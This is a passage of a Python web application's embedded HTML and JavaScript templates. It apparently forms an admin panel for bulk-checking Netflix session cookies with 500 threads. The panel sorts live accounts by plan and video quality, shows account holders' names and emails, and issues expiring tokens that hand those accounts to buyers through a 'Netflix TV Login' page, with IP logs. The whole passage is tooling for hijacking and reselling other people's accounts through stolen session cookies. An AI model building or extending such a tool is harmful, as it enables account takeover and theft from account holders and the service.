            font-size: 3rem;
            color: #E50914;
            margin-bottom: 1rem;
        }
        
        .cancel-btn {
            background: rgba(239, 68, 68, 0.2);
            color: #ef4444;
            border: 1px solid #ef4444;
        }
        
        .cancel-btn:hover {
            background: rgba(239, 68, 68, 0.3);
        }
        
        .save-btn {
            background: rgba(16, 185, 129, 0.2);
            color: #10b981;
            border: 1px solid #10b981;
        }
        
        .save-btn:hover {
            background: rgba(16, 185, 129, 0.3);
        }
        
        .hidden { display: none !important; }
        .mt-4 { margin-top: 1rem; }
        .mb-4 { margin-bottom: 1rem; }
        .flex { display: flex; }
        .gap-4 { gap: 1rem; }
        .items-center { align-items: center; }
        .justify-between { justify-content: space-between; }
        .text-center { text-align: center; }
    </style>
</head>
<body>
    <div class="app">
        <!-- Sidebar -->
        <div class="sidebar">
            <div class="logo">
                <i class="fab fa-netflix"></i>
                <span>ADMIN</span>
            </div>
            
            <div class="nav-item active" onclick="showSection('dashboard')">
                <i class="fas fa-chart-pie"></i>
                <span>Dashboard</span>
            </div>
            <div class="nav-item" onclick="showSection('load')">
                <i class="fas fa-upload"></i>
                <span>Load Cookies</span>
            </div>
            <div class="nav-item" onclick="showSection('cookies')">
                <i class="fas fa-cookie-bite"></i>
                <span>Manage Cookies</span>
            </div>
            <div class="nav-item" onclick="showSection('tokens')">
                <i class="fas fa-key"></i>
                <span>Manage Tokens</span>
            </div>
            <div class="nav-item" onclick="showSection('logs')">
                <i class="fas fa-history"></i>
                <span>Usage Logs</span>
            </div>
            
            <div class="logout">
                <div class="nav-item" onclick="logout()">
                    <i class="fas fa-sign-out-alt"></i>
                    <span>Logout</span>
                </div>
            </div>
        </div>
        
        <!-- Main Content -->
        <div class="main">
            <div class="header">
                <h1 id="pageTitle">Dashboard</h1>
                <div class="user-info">
                    <i class="fas fa-user"></i> {{ session.admin_username }}
                </div>
            </div>
            
            <div id="alertContainer"></div>
            
            <!-- Dashboard Section -->
            <div id="dashboardSection" class="content-section">
                <div class="stats-grid" id="statsContainer">
                    <div class="stat-card">
                        <div class="stat-title">Total Cookies</div>
                        <div class="stat-value" id="totalCookies">-</div>
                        <div class="stat-label">all time</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-title">Valid Cookies</div>
                        <div class="stat-value" id="validCookies">-</div>
                        <div class="stat-label">active accounts</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-title">Invalid Cookies</div>
                        <div class="stat-value" id="invalidCookies">-</div>
                        <div class="stat-label">dead accounts</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-title">Used Cookies</div>
                        <div class="stat-value" id="usedCookies">-</div>
                        <div class="stat-label">accounts used</div>
                    </div>
                </div>
                
                <h3 style="margin: 2rem 0 1rem;">Video Quality Distribution</h3>
                <div class="quality-grid" id="qualityStats"></div>
                
                <h3 style="margin: 2rem 0 1rem;">Recent Activity</h3>
                <div class="table-container">
                    <table id="recentLogs">
                        <thead>
                            <tr>
                                <th>Time</th>
                                <th>Token</th>
                                <th>Account</th>
                                <th>Status</th>
                            </tr>
                        </thead>
                        <tbody></tbody>
                    </table>
                </div>
            </div>
            
            <!-- Load Cookies Section -->
            <div id="loadSection" class="content-section hidden">
                <h2>Load Netflix Cookies</h2>
                <p style="color: #9ca3af; margin-bottom: 1rem;">Paste cookies (one per line) or upload ZIP file</p>
                
                <!-- File Upload -->
                <div class="file-upload" onclick="document.getElementById('zipFile').click()">
                    <i class="fas fa-cloud-upload-alt"></i>
                    <h3>Click to upload ZIP file</h3>
                    <p style="color: #9ca3af;">or drag and drop</p>
                    <input type="file" id="zipFile" accept=".zip" style="display: none;" onchange="uploadZip()">
                </div>
                
                <textarea id="cookieInput" placeholder='Paste cookies here (one per line)
Example:
NetflixId=abc123...
NetflixId=def456...
or just the ID:
abc123...
def456...'></textarea>
                
                <div class="flex gap-4">
                    <button class="btn btn-primary" onclick="loadCookies()">
                        <i class="fas fa-magic"></i> Load & Check (500 threads)
                    </button>
                    <button class="btn" onclick="clearInput()">
                        <i class="fas fa-trash"></i> Clear
                    </button>
                </div>
                
                <!-- Progress Bar -->
                <div id="progressContainer" class="progress-container hidden">
                    <div class="progress-bar">
                        <div id="progressFill" class="progress-fill" style="width: 0%;"></div>
                    </div>
                    
                    <!-- Dynamic Stats -->
                    <div class="dynamic-stats" id="dynamicStats">
                        <div class="stat-item">
                            <div class="stat-label-sm">Total</div>
                            <div class="stat-value-sm" id="statTotal">0</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-label-sm">Checked</div>
                            <div class="stat-value-sm" id="statChecked">0</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-label-sm">Premium</div>
                            <div class="stat-value-sm valid" id="statValid">0</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-label-sm">Invalid</div>
                            <div class="stat-value-sm invalid" id="statInvalid">0</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-label-sm">UHD</div>
                            <div class="stat-value-sm uhd" id="statUHD">0</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-label-sm">HD</div>
                            <div class="stat-value-sm hd" id="statHD">0</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-label-sm">HD720p</div>
                            <div class="stat-value-sm hd720p" id="statHD720p">0</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-label-sm">SD</div>
                            <div class="stat-value-sm sd" id="statSD">0</div>
                        </div>
                    </div>
                    
                    <div class="progress-text" id="progressText">Processing 0/0 cookies...</div>
                    
                    <div class="flex gap-4 justify-center mt-4">
                        <button class="btn cancel-btn" id="cancelBtn" onclick="cancelJob()" style="display: none;">
                            <i class="fas fa-times-circle"></i> Cancel Checking
                        </button>
                        <button class="btn save-btn" id="saveBtn" onclick="saveResults()" style="display: none;">
                            <i class="fas fa-save"></i> Save to Database
                        </button>
                    </div>
                </div>
                
                <div id="loadResult" class="mt-4"></div>
            </div>
            
            <!-- Cookies Section -->
            <div id="cookiesSection" class="content-section hidden">
                <div class="section-header">
                    <h2>Manage Cookies</h2>
                    <div class="flex gap-4">
                        <select id="qualityFilter" onchange="loadCookiesList(1)">
                            <option value="all">All Qualities</option>
                            <option value="UHD">UHD</option>
                            <option value="HD">HD</option>
                            <option value="HD720p">HD720p</option>
                            <option value="SD">SD</option>
                        </select>
                        <button class="btn btn-sm" onclick="recheckCookies()">
                            <i class="fas fa-sync"></i> Recheck
                        </button>
                        <button class="btn btn-sm btn-danger" onclick="deleteInvalid()">
                            <i class="fas fa-trash"></i> Delete Invalid
                        </button>
                    </div>
                </div>
                
                <div class="table-container">
                    <table id="cookiesTable">
                        <thead>
                            <tr>
                                <th><input type="checkbox" id="selectAll" onchange="toggleAll()"></th>
                                <th>Email/Name</th>
                                <th>Quality</th>
                                <th>Country</th>
                                <th>Plan</th>
                                <th>Profiles</th>
                                <th>Status</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody></tbody>
                    </table>
                </div>
                
                <div id="cookiesPagination" class="pagination"></div>
            </div>
            
            <!-- Tokens Section -->
            <div id="tokensSection" class="content-section hidden">
                <div class="section-header">
                    <h2>Manage Tokens</h2>
                    <div class="flex gap-4">
                        <button class="btn btn-sm" onclick="deleteExpiredKeys()">
                            <i class="fas fa-clock"></i> Delete Expired
                        </button>
                        <button class="btn btn-primary" onclick="showGenerateTokenModal()">
                            <i class="fas fa-plus"></i> Generate Token
                        </button>
                    </div>
                </div>
                
                <div class="table-container">
                    <table id="tokensTable">
                        <thead>
                            <tr>
                                <th><input type="checkbox" id="selectAllTokens" onchange="toggleAllTokens()"></th>
                                <th>Token</th>
                                <th>Quality</th>
                                <th>Available</th>
                                <th>Created</th>
                                <th>Expires</th>
                                <th>Status</th>
                                <th>Usage</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody></tbody>
                    </table>
                </div>
                
                <div class="flex gap-4 mt-4">
                    <button class="btn btn-sm" onclick="extendSelectedTokens()">
                        <i class="fas fa-clock"></i> Extend Selected
                    </button>
                    <button class="btn btn-sm btn-danger" onclick="deleteSelectedTokens()">
                        <i class="fas fa-trash"></i> Delete Selected
                    </button>
                </div>
            </div>
            
            <!-- Logs Section -->
            <div id="logsSection" class="content-section hidden">
                <h2>Usage Logs</h2>
                <div class="table-container">
                    <table id="logsTable">
                        <thead>
                            <tr>
                                <th>Time</th>
                                <th>Token</th>
                                <th>Account</th>
                                <th>IP</th>
                                <th>Status</th>
                            </tr>
                        </thead>
                        <tbody></tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Token Generation Modal -->
    <div id="tokenModal" style="display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); align-items: center; justify-content: center; z-index: 1000; animation: fadeIn 0.3s ease;">
        <div style="background: #1a1a1a; border-radius: 24px; padding: 2rem; max-width: 400px; width: 90%; animation: scaleIn 0.3s ease;">
            <h3 style="margin-bottom: 1.5rem;">Generate New Token</h3>
            
            <div class="form-group" style="margin-bottom: 1rem;">
                <label>Video Quality</label>
                <select id="tokenQuality" onchange="checkAvailability()" style="margin-bottom: 0.5rem;">
                    <option value="UHD">UHD</option>
                    <option value="HD">HD</option>
                    <option value="HD720p">HD720p</option>
                    <option value="SD">SD</option>
                </select>
                <div id="availabilityInfo" style="font-size: 0.9rem; color: #10b981;"></div>
            </div>
            
            <div class="form-group" style="margin-bottom: 1rem;">
                <label>Expiry (days)</label>
                <input type="number" id="tokenExpiry" value="30" min="1" max="365">
            </div>
            
            <div class="form-group" style="margin-bottom: 1.5rem;">
                <label>Notes (optional)</label>
                <input type="text" id="tokenNotes" placeholder="e.g., Test token">
            </div>
            
            <div class="flex gap-4">
                <button class="btn btn-primary" onclick="generateToken()">Generate</button>
                <button class="btn" onclick="hideTokenModal()">Cancel</button>
            </div>
        </div>
    </div>
    
    <script>
        let currentSection = 'dashboard';
        let currentPage = 1;
        let selectedCookies = [];
        let selectedTokens = [];
        let currentJobId = null;
        let progressInterval = null;
        
        // Show section
        function showSection(section) {
            currentSection = section;
            document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
            event.currentTarget.classList.add('active');
            
            document.getElementById('dashboardSection').classList.add('hidden');
            document.getElementById('loadSection').classList.add('hidden');
            document.getElementById('cookiesSection').classList.add('hidden');
            document.getElementById('tokensSection').classList.add('hidden');
            document.getElementById('logsSection').classList.add('hidden');
            
            document.getElementById(section + 'Section').classList.remove('hidden');
            document.getElementById('pageTitle').textContent = 
                section === 'dashboard' ? 'Dashboard' :
                section === 'load' ? 'Load Cookies' :
                section === 'cookies' ? 'Manage Cookies' :
                section === 'tokens' ? 'Manage Tokens' : 'Usage Logs';
            
            if (section === 'dashboard') loadDashboard();
            if (section === 'cookies') loadCookiesList(1);
            if (section === 'tokens') loadTokens();
            if (section === 'logs') loadLogs();
        }
        
        // Show alert with animation
        function showAlert(type, message, timeout = 5000) {
            const container = document.getElementById('alertContainer');
            const alert = document.createElement('div');
            alert.className = `alert alert-${type}`;
            alert.innerHTML = `<i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i> ${message}`;
            container.innerHTML = '';
            container.appendChild(alert);
            
            // Add entrance animation
            alert.style.animation = 'slideIn 0.3s ease';
            
            if (timeout > 0) {
                setTimeout(() => {
                    alert.style.animation = 'fadeOut 0.3s ease';
                    setTimeout(() => alert.remove(), 300);
                }, timeout);
            }
        }
        
        // Update progress bar and stats
        function updateProgress(progress) {
            const container = document.getElementById('progressContainer');
            const fill = document.getElementById('progressFill');
            const textEl = document.getElementById('progressText');
            
            container.classList.remove('hidden');
            
            if (progress) {
                fill.style.width = progress.percent + '%';
                textEl.textContent = `Processing ${progress.checked}/${progress.total} cookies (${progress.percent}%)`;
                
                // Update dynamic stats
                document.getElementById('statTotal').textContent = progress.total;
                document.getElementById('statChecked').textContent = progress.checked;
                document.getElementById('statValid').textContent = progress.valid;
                document.getElementById('statInvalid').textContent = progress.invalid;
                document.getElementById('statUHD').textContent = progress.quality_counts.UHD;
                document.getElementById('statHD').textContent = progress.quality_counts.HD;
                document.getElementById('statHD720p').textContent = progress.quality_counts.HD720p;
                document.getElementById('statSD').textContent = progress.quality_counts.SD;
                
                // Show/hide buttons based on status
                if (progress.status === 'running' || progress.status === 'cancelling') {
                    document.getElementById('cancelBtn').style.display = 'block';
                    document.getElementById('saveBtn').style.display = 'none';
                } else if (progress.status === 'completed') {
                    document.getElementById('cancelBtn').style.display = 'none';
                    document.getElementById('saveBtn').style.display = 'block';
                } else if (progress.status === 'cancelled') {
                    document.getElementById('cancelBtn').style.display = 'none';
                    document.getElementById('saveBtn').style.display = 'none';
                    textEl.textContent = 'Job cancelled';
                }
            }
        }
        
        // Poll for progress
        function startProgressPolling(jobId) {
            if (progressInterval) {
                clearInterval(progressInterval);
            }
            
            currentJobId = jobId;
            
            progressInterval = setInterval(() => {
                fetch(`/admin/api/cookies/progress/${jobId}`)
                    .then(res => res.json())
                    .then(data => {
                        if (data.error) {
                            clearInterval(progressInterval);
                            return;
                        }
                        
                        updateProgress(data);
                        
                        // Stop polling if completed or cancelled
                        if (data.status === 'completed' || data.status === 'cancelled') {
                            clearInterval(progressInterval);
                            
                            if (data.status === 'completed') {
                                // Auto-delete invalid cookies happened automatically
                                showAlert('info', '✅ Checking complete! Click "Save to Database" to store results');
                            }
                        }
                    })
                    .catch(err => {
                        console.error('Progress poll error:', err);
                    });
            }, 500); // Poll every 500ms for smooth updates
        }
        
        // Cancel job
        function cancelJob() {
            if (!currentJobId) return;
            
            fetch(`/admin/api/cookies/cancel/${currentJobId}`, {
                method: 'POST'
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    showAlert('info', 'Cancelling job...');
                }
            });
        }
        
        // Save results
        function saveResults() {
            if (!currentJobId) return;
            
            fetch(`/admin/api/cookies/save/${currentJobId}`, {
                method: 'POST'
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    showAlert('success', data.message);
                    document.getElementById('loadResult').innerHTML = `
                        <div class="alert alert-success">
                            <i class="fas fa-check-circle"></i>
                            ${data.message}
                        </div>
                    `;
                    document.getElementById('saveBtn').style.display = 'none';
                    loadDashboard(); // Refresh stats
                } else {
                    showAlert('error', data.error);
                }
            });
        }
        
        // Load cookies from text
        function loadCookies() {
            const content = document.getElementById('cookieInput').value;
            if (!content) {
                showAlert('error', 'Please paste cookies first');
                return;
            }
            
            // Reset progress display
            updateProgress({
                total: 0,
                checked: 0,
                valid: 0,
                invalid: 0,
                quality_counts: {UHD: 0, HD: 0, HD720p: 0, SD: 0},
                percent: 0,
                status: 'running'
            });
            
            fetch('/admin/api/cookies/load', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({content})
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    startProgressPolling(data.job_id);
                    showAlert('success', `Started checking ${data.total} cookies...`);
                } else {
                    showAlert('error', data.error);
                    document.getElementById('progressContainer').classList.add('hidden');
                }
            })
            .catch(error => {
                showAlert('error', 'Request failed');
                document.getElementById('progressContainer').classList.add('hidden');
            });
        }
        
        // Upload ZIP file
        function uploadZip() {
            const file = document.getElementById('zipFile').files[0];
            if (!file) return;
            
            const formData = new FormData();
            formData.append('file', file);
            
            // Reset progress display
            updateProgress({
                total: 0,
                checked: 0,
                valid: 0,
                invalid: 0,
                quality_counts: {UHD: 0, HD: 0, HD720p: 0, SD: 0},
                percent: 0,
                status: 'running'
            });
            
            fetch('/admin/api/cookies/load-zip', {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    startProgressPolling(data.job_id);
                    showAlert('success', `Started checking ${data.total} cookies from ZIP...`);
                } else {
                    showAlert('error', data.error);
                    document.getElementById('progressContainer').classList.add('hidden');
                }
            })
            .catch(error => {
                showAlert('error', 'Upload failed');
                document.getElementById('progressContainer').classList.add('hidden');
            });
        }
        
        // Load dashboard
        function loadDashboard() {
            fetch('/admin/api/stats')
                .then(res => res.json())
                .then(data => {
                    document.getElementById('totalCookies').textContent = data.total_cookies;
                    document.getElementById('validCookies').textContent = data.valid_cookies;
                    document.getElementById('invalidCookies').textContent = data.invalid_cookies;
                    document.getElementById('usedCookies').textContent = data.used_cookies;
                    
                    // Quality stats with availability
                    const qualityHtml = `
                        <div class="quality-card uhd">
                            <div class="quality-name">UHD</div>
                            <div class="quality-count">${data.quality_stats.UHD || 0}</div>
                            <div class="available-count">${data.available_quality_stats.UHD || 0} available</div>
                        </div>
                        <div class="quality-card hd">
                            <div class="quality-name">HD</div>
                            <div class="quality-count">${data.quality_stats.HD || 0}</div>
                            <div class="available-count">${data.available_quality_stats.HD || 0} available</div>
                        </div>
                        <div class="quality-card hd720p">
                            <div class="quality-name">HD720p</div>
                            <div class="quality-count">${data.quality_stats.HD720p || 0}</div>
                            <div class="available-count">${data.available_quality_stats.HD720p || 0} available</div>
                        </div>
                        <div class="quality-card sd">
                            <div class="quality-name">SD</div>
                            <div class="quality-count">${data.quality_stats.SD || 0}</div>
                            <div class="available-count">${data.available_quality_stats.SD || 0} available</div>
                        </div>
                    `;
                    document.getElementById('qualityStats').innerHTML = qualityHtml;
                    
                    // Recent logs
                    let logsHtml = '';
                    data.recent_usage.forEach(log => {
                        logsHtml += `<tr>
                            <td>${new Date(log.used_at).toLocaleString()}</td>
                            <td>${log.token}</td>
                            <td>${log.account_email}</td>
                            <td><span class="badge badge-valid">Success</span></td>
                        </tr>`;
                    });
                    document.querySelector('#recentLogs tbody').innerHTML = logsHtml || '<tr><td colspan="4" style="text-align: center;">No recent activity</td></tr>';
                });
        }
        
        // Load cookies list
        function loadCookiesList(page) {
            currentPage = page;
            const quality = document.getElementById('qualityFilter').value;
            
            fetch(`/admin/api/cookies/list?page=${page}&quality=${quality}`)
                .then(res => res.json())
                .then(data => {
                    let html = '';
                    data.cookies.forEach(cookie => {
                        const qualityClass = 
                            cookie.video_quality === 'UHD' ? 'badge-uhd' :
                            cookie.video_quality === 'HD' ? 'badge-hd' :
                            cookie.video_quality === 'HD720p' ? 'badge-hd720p' : 'badge-sd';
                        
                        const status = cookie.is_used ? 
                            '<span class="badge badge-invalid">Used</span>' : 
                            '<span class="badge badge-valid">Available</span>';
                        
                        html += `<tr>
                            <td><input type="checkbox" class="cookie-check" value="${cookie.netflix_id}" onchange="updateSelected()"></td>
                            <td>
                                <strong>${cookie.name || 'Unknown'}</strong><br>
                                <small style="color: #9ca3af;">${cookie.email || 'No email'}</small>
                            </td>
                            <td><span class="badge ${qualityClass}">${cookie.video_quality}</span></td>
                            <td>${cookie.country || 'Unknown'}</td>
                            <td>${cookie.plan || 'Unknown'}</td>
                            <td>${cookie.connected_profiles || 0}</td>
                            <td>${status}</td>
                            <td>
                                <button class="btn btn-sm" onclick="copyCookie('${cookie.netflix_id}')">
                                    <i class="fas fa-copy"></i>
                                </button>
                            </td>
                        </tr>`;
                    });
                    
                    document.querySelector('#cookiesTable tbody').innerHTML = html || '<tr><td colspan="8" style="text-align: center;">No cookies found</td></tr>';
                    
                    // Pagination
                    let pages = '';
                    for (let i = 1; i <= data.pages; i++) {
                        pages += `<button class="page-btn ${i === page ? 'active' : ''}" onclick="loadCookiesList(${i})">${i}</button>`;
                    }
                    document.getElementById('cookiesPagination').innerHTML = pages;
                });
        }
        
        // Load tokens
        function loadTokens() {
            fetch('/admin/api/tokens/list')
                .then(res => res.json())
                .then(data => {
                    let html = '';
                    data.tokens.forEach(token => {
                        const isExpired = new Date(token.expires_at) < new Date();
                        const qualityClass = 
                            token.video_quality === 'UHD' ? 'badge-uhd' :
                            token.video_quality === 'HD' ? 'badge-hd' :
                            token.video_quality === 'HD720p' ? 'badge-hd720p' : 'badge-sd';
                        
                        html += `<tr>
                            <td><input type="checkbox" class="token-check" value="${token.token}" onchange="updateSelectedTokens()"></td>
                            <td><code>${token.token}</code></td>
                            <td><span class="badge ${qualityClass}">${token.video_quality}</span></td>
                            <td><span class="badge badge-valid">${token.available_accounts || 0}</span></td>
                            <td>${new Date(token.created_at).toLocaleDateString()}</td>
                            <td>${new Date(token.expires_at).toLocaleDateString()}</td>
                            <td>
                                ${isExpired ? '<span class="badge badge-invalid">Expired</span>' : 
                                  token.is_active ? '<span class="badge badge-valid">Active</span>' : 
                                  '<span class="badge badge-invalid">Inactive</span>'}
                            </td>
                            <td>${token.usage_count || 0}</td>
                            <td>
                                <button class="btn btn-sm" onclick="copyToken('${token.token}')">
                                    <i class="fas fa-copy"></i>
                                </button>
                            </td>
                        </tr>`;
                    });
                    
                    document.querySelector('#tokensTable tbody').innerHTML = html || '<tr><td colspan="9" style="text-align: center;">No tokens found</td></tr>';
                });
        }
        
        // Load logs
        function loadLogs() {
            fetch('/admin/api/stats')
                .then(res => res.json())
                .then(data => {
                    let html = '';
                    data.recent_usage.forEach(log => {
                        html += `<tr>
                            <td>${new Date(log.used_at).toLocaleString()}</td>
                            <td>${log.token}</td>
                            <td>${log.account_email}</td>
                            <td>${log.ip || 'Unknown'}</td>
                            <td><span class="badge badge-valid">Success</span></td>
                        </tr>`;
                    });
                    
                    document.querySelector('#logsTable tbody').innerHTML = html || '<tr><td colspan="5" style="text-align: center;">No logs found</td></tr>';
                });
        }
        
        // Check availability before generating token
        function checkAvailability() {
            const quality = document.getElementById('tokenQuality').value;
            
            fetch('/admin/api/tokens/check-availability', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({video_quality: quality})
            })
            .then(res => res.json())
            .then(data => {
                const info = document.getElementById('availabilityInfo');
                if (data.available > 0) {
                    info.innerHTML = `✅ ${data.available} accounts available`;
                    info.style.color = '#10b981';
                } else {
                    info.innerHTML = `❌ No ${quality} accounts available!`;
                    info.style.color = '#ef4444';
                }
            });
        }
        
        // Token functions
        function showGenerateTokenModal() {
            document.getElementById('tokenModal').style.display = 'flex';
            checkAvailability();
        }
        
        function hideTokenModal() {
            document.getElementById('tokenModal').style.display = 'none';
        }
        
        function generateToken() {
            const quality = document.getElementById('tokenQuality').value;
            const days = document.getElementById('tokenExpiry').value;
            const notes = document.getElementById('tokenNotes').value;
            
            fetch('/admin/api/tokens/generate', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({video_quality: quality, expiry_days: days, notes})
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    showAlert('success', data.message);
                    hideTokenModal();
                    loadTokens();
                } else {
                    showAlert('error', data.error);
                }
            });
        }
        
        function deleteExpiredKeys() {
            if (!confirm('Delete all expired tokens?')) return;
            
            fetch('/admin/api/cookies/delete-expired-keys', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'}
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    showAlert('success', data.message);
                    loadTokens();
                }
            });
        }
        
        function updateSelectedTokens() {
            selectedTokens = Array.from(document.querySelectorAll('.token-check:checked')).map(cb => cb.value);
        }
        
        function toggleAllTokens() {
            const checked = document.getElementById('selectAllTokens').checked;
            document.querySelectorAll('.token-check').forEach(cb => cb.checked = checked);
            updateSelectedTokens();
        }
        
        function extendSelectedTokens() {
            if (selectedTokens.length === 0) {
                showAlert('error', 'No tokens selected');
                return;
            }
            
            const days = prompt('Enter days to extend:', '30');
            if (!days) return;
            
            fetch('/admin/api/tokens/extend', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({tokens: selectedTokens, days: parseInt(days)})
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    showAlert('success', data.message);
                    loadTokens();
                }
            });
        }
        
        function deleteSelectedTokens() {
            if (selectedTokens.length === 0) {
                showAlert('error', 'No tokens selected');
                return;
            }
            
            if (!confirm('Delete selected tokens?')) return;
            
            fetch('/admin/api/tokens/delete', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({tokens: selectedTokens})
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    showAlert('success', data.message);
                    loadTokens();
                }
            });
        }
        
        function copyToken(token) {
            navigator.clipboard.writeText(token);
            showAlert('success', 'Token copied!');
        }
        
        // Cookie functions
        function updateSelected() {
            selectedCookies = Array.from(document.querySelectorAll('.cookie-check:checked')).map(cb => cb.value);
        }
        
        function toggleAll() {
            const checked = document.getElementById('selectAll').checked;
            document.querySelectorAll('.cookie-check').forEach(cb => cb.checked = checked);
            updateSelected();
        }
        
        function deleteInvalid() {
            if (!confirm('Delete all invalid cookies?')) return;
            
            fetch('/admin/api/cookies/delete', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({delete_all_invalid: true})
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    showAlert('success', data.message);
                    loadCookiesList(currentPage);
                    loadDashboard();
                }
            });
        }
        
        function recheckCookies() {
            const quality = document.getElementById('qualityFilter').value;
            
            fetch('/admin/api/cookies/recheck', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({quality, limit: 100})
            })
            .then(res => res.json())
            .then(data => {
                if (data.success) {
                    showAlert('success', `Rechecking ${data.total} cookies...`);
                    startProgressPolling(data.job_id);
                }
            });
        }
        
        function copyCookie(netflixId) {
            navigator.clipboard.writeText(netflixId);
            showAlert('success', 'NetflixId copied!');
        }
        
        function clearInput() {
            document.getElementById('cookieInput').value = '';
        }
        
        // Logout
        function logout() {
            window.location.href = '/admin/logout';
        }
        
        // Initial load
        loadDashboard();
    </script>
</body>
</html>
'''

# -------------------------------------------------------------------
# USER TEMPLATE (Enhanced with animations)
# -------------------------------------------------------------------

USER_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix TV Login</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: radial-gradient(circle at 10% 20%, rgba(229, 9, 20, 0.15) 0%, transparent 30%),
                        radial-gradient(circle at 90% 80%, rgba(229, 9, 20, 0.1) 0%, transparent 30%),
                        linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
            color: #ffffff;
            min-height: 100vh;
            line-height: 1.5;
            padding: 1.5rem;
            animation: gradientShift 15s ease infinite;
            background-size: 400% 400%;
        }
        
        @keyframes gradientShift {
            0% { background-position: 0% 0%; }
            50% { background-position: 100% 100%; }
            100% { background-position: 0% 0%; }
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
        }

        .header {
            text-align: center;
            margin-bottom: 2rem;
            animation: fadeInDown 0.8s ease;
        }
        
        @keyframes fadeInDown {
            from {
                opacity: 0;
                transform: translateY(-30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .logo {
            font-size: 3.5rem;
            font-weight: 800;
            background: linear-gradient(135deg, #E50914 0%, #ff5e5e 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        .main-card {
            background: rgba(20, 20, 20, 0.8);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 32px;
            padding: 2rem;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
            animation: fadeInUp 0.8s ease 0.2s both;
        }
        
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* Token Input */
        .token-container {
            max-width: 500px;
            margin: 0 auto;
            text-align: center;
        }

        .token-input {
            width: 100%;
            padding: 1.5rem;
            background: rgba(0, 0, 0, 0.4);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            color: #ffffff;
            font-family: 'Inter', monospace;
            font-size: 1.5rem;
            text-align: center;
            letter-spacing: 4px;
            margin-bottom: 1rem;
            transition: all 0.3s;
        }

        .token-input:focus {
            outline: none;
            border-color: #E50914;
            box-shadow: 0 0 0 4px rgba(229, 9, 20, 0.1);
            transform: scale(1.02);
        }

        .quality-badge {
            display: inline-block;
            padding: 0.5rem 1.5rem;
            border-radius: 40px;
            font-weight: 600;
            margin: 1rem 0;
            animation: scaleIn 0.3s ease;
        }
        
        @keyframes scaleIn {
            from {
                opacity: 0;
                transform: scale(0);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }

        .quality-badge.uhd { background: rgba(229, 9, 20, 0.2); color: #E50914; }
        .quality-badge.hd { background: rgba(59, 130, 246, 0.2); color: #3b82f6; }
        .quality-badge.hd720p { background: rgba(16, 185, 129, 0.2); color: #10b981; }
        .quality-badge.sd { background: rgba(245, 158, 11, 0.2); color: #f59e0b; }

        /* Account Grid */
        .account-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 1.5rem;
            margin: 1.5rem 0;
        }

        .account-card {
            background: rgba(30, 30, 30, 0.6);
            border: 2px solid rgba(255, 255, 255, 0.05);
            border-radius: 24px;
            padding: 1.5rem;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
            animation: fadeIn 0.5s ease;
            animation-fill-mode: both;
        }
        
        .account-card:nth-child(1) { animation-delay: 0.1s; }
        .account-card:nth-child(2) { animation-delay: 0.2s; }
